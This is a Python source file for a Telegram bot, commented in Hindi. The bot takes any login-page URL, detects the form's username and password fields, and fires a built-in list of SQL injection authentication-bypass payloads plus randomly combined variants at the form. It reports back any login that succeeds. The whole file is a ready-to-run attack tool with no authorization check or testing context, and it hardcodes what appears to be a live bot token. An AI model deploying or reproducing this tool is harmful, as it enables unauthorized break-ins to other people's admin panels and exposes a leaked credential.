import telebot
import requests
from bs4 import BeautifulSoup
import time
import random
from flask import Flask
from threading import Thread

# Render को सक्रिय रखने के लिए Flask सर्वर
app = Flask('')

@app.route('/')
def home():
    return "AI Slayer is Running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# आपका टेलीग्राम बोट टोकन
TOKEN = '8391067758:AAG1DijQMlWl6gSDU7SR_e4pOOnNfSGe3BE'
bot = telebot.TeleBot(TOKEN)

# आपकी पूरी SQL Injection पेलोड लिस्ट
base_payloads = [
    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*", "admin' --", "admin' #", "admin'/*",
    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#",
    "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#",
    "admin') or '1'='1'/*", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "admin\" --", "admin\" #", "admin\"/*", "admin\" or \"1\"=\"1", "admin\" or \"1\"=\"1\"--",
    "admin\" or \"1\"=\"1\"#", "admin\" or \"1\"=\"1\"/*", "admin\"or 1=1 or \"\"=\"",
    "admin\" or 1=1", "admin\" or 1=1--", "admin\" or 1=1#", "admin\" or 1=1/*",
    "admin\") or (\"1\"=\"1", "admin\") or (\"1\"=\"1\"--", "admin\") or (\"1\"=\"1\"#",
    "admin\") or (\"1\"=\"1\"/*", "admin\") or \"1\"=\"1", "admin\") or \"1\"=\"1\"--",
    "admin\") or \"1\"=\"1\"#", "admin\") or \"1\"=\"1\"/*",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
    "' or ''='", "' or 1=1", "' or 'a'='a"
]

def ai_payload_generator():
    """AI Fuzzing logic: लिस्ट खत्म होने के बाद नए पेलोड्स बनाने के लिए"""
    sql_parts = ["' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "') OR ('1'='1", " admin' #", " ' UNION SELECT 1,2,3--"]
    extra = ["--", "#", "/*", "'", "\"", "||", "&&"]
    generated = []
    for _ in range(30): # 30 नए रैंडम पेलोड्स
        p = f"{random.choice(sql_parts)}{random.choice(extra)}"
        generated.append(p)
    return list(set(generated))

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "🤖 **Web-Slayer V4.0 (AI Integrated)**\n\n"
        "एडमिन लॉगिन पेज का URL भेजें।\n"
        "1. पहले आपकी दी गई लिस्ट टेस्ट होगी।\n"
        "2. फिर AI खुद के नए SQL पेलोड्स जनरेट करेगा।"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def attack(message):
    target_url = message.text
    chat_id = message.chat.id
    bot.send_message(chat_id, "📡 ब्राउज़र सेशन और AI इंजन तैयार कर रहा हूँ...")

    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    try:
        # Step 1: फॉर्म और इनपुट बॉक्स डिटेक्ट करना
        res = session.get(target_url, headers=headers, timeout=15)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        
        if not form:
            bot.send_message(chat_id, "❌ लॉगिन फॉर्म नहीं मिला। कृपया सही URL भेजें।")
            return

        inputs = form.find_all('input')
        input_names = [i.get('name') for i in inputs if i.get('name')]
        hidden_data = {i.get('name'): i.get('value', '') for i in inputs if i.get('type') == 'hidden'}

        # यूजरनेम और पासवर्ड बॉक्स की पहचान
        user_key = next((n for n in input_names if any(x in n.lower() for x in ['user', 'login', 'id', 'email'])), input_names[0])
        pass_key = next((n for n in input_names if 'pass' in n.lower()), input_names[1] if len(input_names)>1 else 'password')

        final_payloads = base_payloads + ai_payload_generator()
        bot.send_message(chat_id, f"🚀 हमला शुरू! कुल {len(final_payloads)*2} टेस्ट किए जाएंगे।\nKeys: `{user_key}` & `{pass_key}`", parse_mode="Markdown")

        found = False
        for p in final_payloads:
            # टेस्ट केस: (Payload, Payload) और (admin, Payload)
            for u, pwd in [(p, p), ('admin', p)]:
                post_data = {user_key: u, pass_key: pwd}
                post_data.update(hidden_data) # Hidden tokens जोड़ना

                try:
                    response = session.post(target_url, data=post_data, headers=headers, allow_redirects=True, timeout=10)
                    
                    # सफलता की पहचान
                    success_keywords = ["logout", "signout", "dashboard", "welcome", "admin/index", "manage", "home"]
                    page_text = response.text.lower()
                    
                    if any(word in response.url.lower() for word in success_keywords) or \
                       any(word in page_text for word in ["logout", "sign out", "welcome admin", "logged in"]):
                        
                        method = "AI Generated" if p not in base_payloads else "List Base"
                        bot.send_message(chat_id, f"✅ **SUCCESS! LOGIN FOUND**\n\n🔗 URL: {response.url}\n👤 User: `{u}`\n🔑 Pass: `{pwd}`\n🤖 Method: {method}", parse_mode="Markdown")
                        found = True
                        break
                except:
                    continue
                time.sleep(0.3) # सर्वर ब्लॉक न करे इसलिए छोटा गैप
            if found: break

        if not found:
            bot.send_message(chat_id, "❌ कोई भी पेलोड काम नहीं आया। वेबसाइट सुरक्षित हो सकती है या Captcha लगा हो सकता है।")

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ एरर: {str(e)}")

if __name__ == "__main__":
    keep_alive() # Render के लिए सर्वर चालू करना
    bot.polling(none_stop=True)
